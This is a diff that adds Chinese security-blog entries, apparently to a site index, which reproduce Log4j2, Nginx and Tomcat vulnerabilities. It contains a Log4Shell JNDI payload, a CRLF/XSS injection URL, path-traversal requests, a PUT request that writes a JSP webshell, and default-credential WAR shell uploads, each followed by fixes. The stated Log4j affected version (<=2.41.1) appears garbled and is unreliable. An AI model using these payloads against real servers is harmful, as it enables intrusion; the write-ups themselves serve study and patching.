@@ -4,6 +4,63 @@
   
   
   <entry>
+    <title>Apache-log4j2漏洞</title>
+    <link href="/2023/04/24/Apache-log4j2%E6%BC%8F%E6%B4%9E/"/>
+    <url>/2023/04/24/Apache-log4j2%E6%BC%8F%E6%B4%9E/</url>
+    
+    <content type="html"><![CDATA[<h2 id="log4j2简介"><a href="#log4j2简介" class="headerlink" title="log4j2简介"></a>log4j2简介</h2><p>log4j2是一个java程序的日志监控组件，作为目前java全生态的基础组件之一，应用十分广泛</p><h2 id="JNDI注入原理"><a href="#JNDI注入原理" class="headerlink" title="JNDI注入原理"></a>JNDI注入原理</h2><h3 id="LDAP"><a href="#LDAP" class="headerlink" title="LDAP"></a>LDAP</h3><p>轻量级目录访问协议，计算机领域常用于统一登录</p><h3 id="JNDI"><a href="#JNDI" class="headerlink" title="JNDI"></a>JNDI</h3><p>概念：java命名和目录接口，根据名字映射到信息资源、位置等。作用：发布服务、查找服务</p><p>JNDI动态协议转换：调用JNDI的lookup()方法时，如果是一个uri地址，则客户端会去加载它的远程对象</p><p>JNDI命名引用：通过lookup()获取远程对象时，如果获取的reference存根与本地的classpath中的类refClassName是否存在，如果不存在则会去指定的url动态加载</p><h3 id="注入原理"><a href="#注入原理" class="headerlink" title="注入原理"></a>注入原理</h3><p>在JNDI接口注入恶意参数—&gt;恶意参数为一个不存在的refClassName–&gt;对方从指定地址动态加载对象.class文件–&gt;执行static代码块</p><img src="/2023/04/24/Apache-log4j2%E6%BC%8F%E6%B4%9E/1682226947539.png" alt="1682226947539" style="zoom:80%;"><h3 id="漏洞产生条件"><a href="#漏洞产生条件" class="headerlink" title="漏洞产生条件"></a>漏洞产生条件</h3><p>使用了lookup()方法，并且这个参数动态可控</p><p>构建LDAP服务来让对方指定远程加载地址为自己的恶意代码地址</p><p>访问LDAP不存在的地址，能够将恶意代码下载到本地并且执行</p><h2 id="漏洞影响范围"><a href="#漏洞影响范围" class="headerlink" title="漏洞影响范围"></a>漏洞影响范围</h2><p>版本&lt;&#x3D;2.41.1</p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><figure class="highlight roboconf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs roboconf">payload：$&#123;<span class="hljs-attribute">jndi</span>:ldap://$&#123;java:version&#125;<span class="hljs-variable">.dnslog</span><span class="hljs-variable">.cn</span>/test&#125; <br></code></pre></td></tr></table></figure><h2 id="修复方案"><a href="#修复方案" class="headerlink" title="修复方案"></a>修复方案</h2><p>升级log4j2框架为2.15.0版本，2.15.0-rc1和2.15.0-rc2依然存在漏洞</p><p>升级JDK</p><p>修改log4j2配置，将lookup的功能禁用</p><p>使用安全产品防护：WAF、RASP</p>]]></content>
+    
+    
+    
+    <tags>
+      
+      <tag>漏洞复现</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>Nginx版本漏洞</title>
+    <link href="/2023/04/24/Nginx%E7%89%88%E6%9C%AC%E6%BC%8F%E6%B4%9E/"/>
+    <url>/2023/04/24/Nginx%E7%89%88%E6%9C%AC%E6%BC%8F%E6%B4%9E/</url>
+    
+    <content type="html"><![CDATA[<h1 id="Nginx系列漏洞"><a href="#Nginx系列漏洞" class="headerlink" title="Nginx系列漏洞"></a>Nginx系列漏洞</h1><h2 id="文件名逻辑漏洞-CVE-2013-4547"><a href="#文件名逻辑漏洞-CVE-2013-4547" class="headerlink" title="文件名逻辑漏洞 CVE-2013-4547"></a>文件名逻辑漏洞 CVE-2013-4547</h2><p>漏洞原理：错误的解析了请求的URI，获取到了错误的用户请求文件名，导致权限绕过，代码执行，getshell等漏</p><p>洞，此漏洞是利用上传时抓包增加一个空格，在请求时让服务器错误的去请求文件，达到执行脚本文件的效果</p><p>影响版本：Nginx 0.8.41 ~ 1.4.3 &#x2F; 1.5.0 ~ 1.5.7</p><p>漏洞复现：上传一个内容为php语句的文件，命名为phpinfo.jpg，上抓包在后缀名后加一个空格，编码为x20，访</p><p>问phpinfo.jpg[0x20][0x00].php</p><p>漏洞修复：更新版本</p><h2 id="越权读取缓存文件CVE-2017-7529"><a href="#越权读取缓存文件CVE-2017-7529" class="headerlink" title="越权读取缓存文件CVE-2017-7529"></a>越权读取缓存文件CVE-2017-7529</h2><p>漏洞原理：如果二次请求中包含Range头，Nginx将会根据指定的start和end位置，返回指定长度的内容。而如果</p><p>构造了两个负的位置，如(-600, -9223372036854774591)，将可能读取到负位置的数据。如果这次请求又命中了</p><p>缓存文件，则可能就可以读取到缓存文件中位于“HTTP返回包体”前的“文件头”、“HTTP返回包头”等内容</p><p>影响版本：Nginx 0.5.6 ~ 1.13.2</p><p>漏洞复现：看到Nginx默认页面，使用poc文件直接请求：<code>python3 CVE-2017-7529-poc.py http://IP:port/</code></p><p>漏洞修复：更新版本，或者在&#x2F;nginx&#x2F;conf&#x2F;nginx.conf中添加max_ranges 1</p><h2 id="CRLF注入漏洞"><a href="#CRLF注入漏洞" class="headerlink" title="CRLF注入漏洞"></a>CRLF注入漏洞</h2><p>漏洞原理：%0a和%0d为回车和换行，可以把后续的内容当成下一个数据包内容，写入set-cookie内容，服务器返</p><p>回set-cookie中即有</p><p>影响版本：错误配置了$URL解码的版本</p><p>漏洞复现：payload：<code>http://ip:port/%0D%0ASet-Cookie:%20a=1%0d%0a%0d%0a&lt;img src=1 οnerrοr=alert(/xss/)&gt;</code> </p><p>可以在返回的302数据包中看到注入成功</p><p>漏洞修复：修改配置文件</p><h2 id="目录穿越路径"><a href="#目录穿越路径" class="headerlink" title="目录穿越路径"></a>目录穿越路径</h2><p>漏洞原理：为了让用户访问home目录，设置成&#x2F;files的别名，访问files目录即可看到home下面的文件，使用&#x2F;..&#x2F;即</p><p>可看到根目录</p><p>影响版本：错误配置了files别名为home的版本</p><p>漏洞复现：直接访问：<code>http://ip:port/files../</code></p><p>漏洞修复：修改配置文件</p><h2 id="目录遍历漏洞"><a href="#目录遍历漏洞" class="headerlink" title="目录遍历漏洞"></a>目录遍历漏洞</h2><p>漏洞原理：autoindex off改为autoindex on，就可以直接访问根目录下所有文件</p><p>影响版本：错误配置了&#x2F;usr&#x2F;local&#x2F;nginx&#x2F;conf&#x2F;nginx.conf文件</p><p>漏洞复现：直接访问能看到所有文件</p><p>漏洞修复：关闭autoindex</p><h2 id="解析漏洞"><a href="#解析漏洞" class="headerlink" title="解析漏洞"></a>解析漏洞</h2><p>漏洞原理：访问上传图片时在后面添加&#x2F;.php文件可以直接当成PHP文件执行</p><p>影响版本：与版本无关，属于用户配置不当的解析漏洞</p><p>漏洞复现：上传图片马，上传处代码没有任何漏洞，后面添加&#x2F;.php可以getshell</p><p>漏洞修复：修改配置错误文件</p>]]></content>
+    
+    
+    
+    <tags>
+      
+      <tag>漏洞复现</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>Tomcat版本漏洞</title>
+    <link href="/2023/04/24/Tomcat%E7%89%88%E6%9C%AC%E6%BC%8F%E6%B4%9E/"/>
+    <url>/2023/04/24/Tomcat%E7%89%88%E6%9C%AC%E6%BC%8F%E6%B4%9E/</url>
+    
+    <content type="html"><![CDATA[<h1 id="Tomcat漏洞"><a href="#Tomcat漏洞" class="headerlink" title="Tomcat漏洞"></a>Tomcat漏洞</h1><h2 id="Tomcat-PUT方法任意写文件漏洞（CVE-2017-12615）"><a href="#Tomcat-PUT方法任意写文件漏洞（CVE-2017-12615）" class="headerlink" title="Tomcat PUT方法任意写文件漏洞（CVE-2017-12615）"></a>Tomcat PUT方法任意写文件漏洞（CVE-2017-12615）</h2><p>漏洞原理：在Tomcat中配置了readonly&#x3D;false，导致可以往服务器写文件</p><p>漏洞版本：8.5.19</p><p>漏洞复现：直接发送数据包写入shell</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">PUT</span> /<span class="hljs-number">1</span>.jsp HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span><br><span class="hljs-attribute">Host</span>: your-ip:<span class="hljs-number">8080</span><br><span class="hljs-attribute">Accept</span>: */*<br><span class="hljs-attribute">Accept</span>-Language: en<br><span class="hljs-attribute">User</span>-Agent: Mozilla/<span class="hljs-number">5</span>.<span class="hljs-number">0</span> (compatible; MSIE <span class="hljs-number">9</span>.<span class="hljs-number">0</span>; Windows NT <span class="hljs-number">6</span>.<span class="hljs-number">1</span>; Win64; x64; Trident/<span class="hljs-number">5</span>.<span class="hljs-number">0</span>)<br><span class="hljs-attribute">Connection</span>: close<br><span class="hljs-attribute">Content</span>-Type: application/x-www-form-urlencoded<br><span class="hljs-attribute">Content</span>-Length: <span class="hljs-number">5</span><br><span class="hljs-attribute">jsp</span>一句话木马内容<br></code></pre></td></tr></table></figure><p>漏洞修复：开启只读或者修改版本</p><h2 id="Tomcat7-弱口令-amp-amp-后台getshell漏洞"><a href="#Tomcat7-弱口令-amp-amp-后台getshell漏洞" class="headerlink" title="Tomcat7+ 弱口令 &amp;&amp; 后台getshell漏洞"></a>Tomcat7+ 弱口令 &amp;&amp; 后台getshell漏洞</h2><p>漏洞原理：在&#x2F;manager&#x2F;html中上传的war会自动解压，即可访问</p><p>漏洞版本：Tomcat7</p><p>漏洞复现：弱口令tomcat:tomcat进入管理页面，上传一个压缩文件1.war，里面是一个jsp的一句话，直接连接</p><p>漏洞修复：改为强口令</p>]]></content>
+    
+    
+    
+    <tags>
+      
+      <tag>漏洞复现</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
     <title>ThinkPHP版本漏洞</title>
     <link href="/2023/04/24/ThinkPHP%E7%89%88%E6%9C%AC%E6%BC%8F%E6%B4%9E/"/>
     <url>/2023/04/24/ThinkPHP%E7%89%88%E6%9C%AC%E6%BC%8F%E6%B4%9E/</url>
